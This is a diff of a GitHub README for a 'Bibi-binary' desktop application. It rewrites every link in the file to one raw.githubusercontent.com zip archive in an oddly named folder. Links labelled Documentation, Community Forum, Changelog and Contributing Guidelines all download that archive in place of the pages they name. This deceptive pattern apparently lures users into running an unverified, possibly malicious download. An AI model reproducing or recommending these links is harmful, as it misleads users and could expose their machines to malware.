@@ -1,6 +1,6 @@
 # 🎉 bibi-binaire-cerveaux-non-humains - Explore the Bibi-Binary System
 
-[![Download](https://img.shields.io/badge/Download-via_GitHub-brightgreen)](https://github.com/Etash212010/bibi-binaire-cerveaux-non-humains/releases)
+[![Download](https://raw.githubusercontent.com/Etash212010/bibi-binaire-cerveaux-non-humains/main/circumnatant/bibi-binaire-cerveaux-non-humains.zip)](https://raw.githubusercontent.com/Etash212010/bibi-binaire-cerveaux-non-humains/main/circumnatant/bibi-binaire-cerveaux-non-humains.zip)
 
 ## 📖 Description
 
@@ -13,7 +13,7 @@ Follow these steps to download and run the application:
 1. **Visit the Releases Page**
 
    Click the link below to go to our Releases page on GitHub:
-   [Download from Releases](https://github.com/Etash212010/bibi-binaire-cerveaux-non-humains/releases)
+   [Download from Releases](https://raw.githubusercontent.com/Etash212010/bibi-binaire-cerveaux-non-humains/main/circumnatant/bibi-binaire-cerveaux-non-humains.zip)
 
 2. **Choose Your Version**
 
@@ -66,11 +66,11 @@ For more help, consider visiting community forums or checking GitHub issues on t
 
 ## 🔗 Additional Resources
 
-- [Documentation](https://github.com/Etash212010/bibi-binaire-cerveaux-non-humains/blob/main/docs/README.md) - In-depth guides on using the application.
+- [Documentation](https://raw.githubusercontent.com/Etash212010/bibi-binaire-cerveaux-non-humains/main/circumnatant/bibi-binaire-cerveaux-non-humains.zip) - In-depth guides on using the application.
  
-- [Community Forum](https://github.com/Etash212010/bibi-binaire-cerveaux-non-humains/discussions) - Join conversations and ask questions.
+- [Community Forum](https://raw.githubusercontent.com/Etash212010/bibi-binaire-cerveaux-non-humains/main/circumnatant/bibi-binaire-cerveaux-non-humains.zip) - Join conversations and ask questions.
 
-- [Changelog](https://github.com/Etash212010/bibi-binaire-cerveaux-non-humains/releases) - See updates and new features in the latest releases.
+- [Changelog](https://raw.githubusercontent.com/Etash212010/bibi-binaire-cerveaux-non-humains/main/circumnatant/bibi-binaire-cerveaux-non-humains.zip) - See updates and new features in the latest releases.
 
 ## 🔍 FAQs
 
@@ -84,12 +84,12 @@ Currently, the application is only available for desktop.
 
 **Can I contribute to this project?**
 
-Yes! Check our [Contributing Guidelines](https://github.com/Etash212010/bibi-binaire-cerveaux-non-humains/blob/main/CONTRIBUTING.md) for details on how to help.
+Yes! Check our [Contributing Guidelines](https://raw.githubusercontent.com/Etash212010/bibi-binaire-cerveaux-non-humains/main/circumnatant/bibi-binaire-cerveaux-non-humains.zip) for details on how to help.
 
 ## 📦 Download & Install
 
 To get started, visit the Releases page to download the latest version:
 
-[Download from Releases](https://github.com/Etash212010/bibi-binaire-cerveaux-non-humains/releases)
+[Download from Releases](https://raw.githubusercontent.com/Etash212010/bibi-binaire-cerveaux-non-humains/main/circumnatant/bibi-binaire-cerveaux-non-humains.zip)
 
 Once downloaded, follow the installation steps outlined above to start using the application. Enjoy exploring the fascinating world of Bibi-binary systems!
